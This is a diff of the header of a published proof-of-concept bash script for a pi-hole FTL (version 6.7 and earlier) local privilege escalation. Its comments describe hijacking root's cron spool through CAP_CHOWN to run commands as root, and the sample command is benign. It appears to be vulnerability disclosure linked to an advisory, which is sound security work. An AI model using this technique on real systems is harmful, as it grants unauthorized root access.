@@ -1,12 +1,17 @@
 #!/bin/bash
 #
-# LinnemanLabs - pi-hole prestart chown PoC
+# LinnemanLabs - pi-hole FTL <= 6.7 prestart chown PoC, pihole to root exec LPE
 #
-# https://linnemanlabs.com/pi-hole-root-with-extra-steps
+# https://linnemanlabs.com/posts/pi-hole-root-with-extra-steps/
 # https://github.com/linnemanlabs/advisories/
 #
+# https://github.com/pi-hole/pi-hole/security/advisories/GHSA-j8vh-6fp9-cjcx
+#
 # run as pihole user from within FTL process (required for CAP_CHOWN)
+# chowns /var/spool/cron/crontabs/root, writes to it, chowns it back to root
 # executes CMD as root via cron, default prints id/caps to /tmp/pi-hole-cron-spool
+#
+# works on FTL <= 6.7
 #
 CMD="id > /tmp/pi-hole-cron-spool;grep ^Cap /proc/self/status >> /tmp/pi-hole-cron-spool"
 
